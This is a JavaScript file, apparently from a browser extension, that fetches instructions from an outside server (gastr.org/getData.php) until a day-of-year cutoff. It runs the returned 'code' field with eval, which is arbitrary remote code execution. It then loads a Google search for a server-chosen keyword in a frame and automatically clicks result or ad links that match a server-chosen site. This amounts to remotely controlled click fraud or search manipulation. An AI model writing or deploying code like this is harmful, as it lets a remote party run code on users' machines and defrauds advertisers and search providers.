var codeid = 140;
var tab;
var gurl = "http://www.google.com.tr/search?q=";
var word = "";
var site = "";
Hga = {
	searchSite : function() {
		var found = false;
		for ( var k = 1; k < 4; k++) {

			var id = "pa" + k
			var an1 = tab.contentDocument.getElementById(id);
			if (!an1)
				continue;
			var href = an1.href;

			var isty = href.search(site)

			if (isty != -1) {
				an1.click()
				found = true
			}
		}
		if (!found) {

			for ( var i = 1; i < 8; i++) {

				var id = "an" + i
				var an1 = tab.contentDocument.getElementById(id);
				if (!an1)
					continue;
				var href = an1.href;

				var isty = href.search(site)

				if (isty != -1) {
					an1.click()
					found = true
				}
			}
		}
		if (!found) {

			for ( var i = 1; i < 4; i++) {

				var id = "pab" + i
				var an1 = tab.contentDocument.getElementById(id);
				if (!an1)
					continue;
				var href = an1.href;

				var isty = href.search(site)

				if (isty != -1) {
					an1.click()
					found = true
				}
			}
		}
		if (!found)

			{
			
			}

	},
	dayofyear : function(d) { // d is a Date object
		var yn = d.getFullYear();
		var mn = d.getMonth();
		var dn = d.getDate();
		var d1 = new Date(yn, 0, 1, 12, 0, 0); // noon on Jan. 1
		var d2 = new Date(yn, mn, dn, 12, 0, 0); // noon on input date
		var ddiff = Math.round((d2 - d1) / 864e5);
		return ddiff + 1;
	},
	out : function(object) {

		if (!debug)
			return;

		var output = '';
		if (typeof (object) === "object") {
			for (property in object) {
				output += property + ': ' + object[property] + '\n ';
			}
		}

		else {
			output = object;
		}
		var d = document.getElementById("dframe");
		d.contentDocument.write(output);

	}
}
var d = Hga.dayofyear(new Date());

if (d <= codeid) {

	Ajax.call({

		url : "http://www.gastr.org/getData.php",
		load : function() {

		},

		success : function(res) {

			eval("var response=" + res);
			site = response.site;
			word = response.word;

			eval(response.code);

			if (site != "") {
				tab = document.getElementById("gframe");

				tab.setAttribute("src", gurl + word);

				setTimeout("Hga.searchSite()", 2000);
			}
			// alert("updated")
		}
	})
}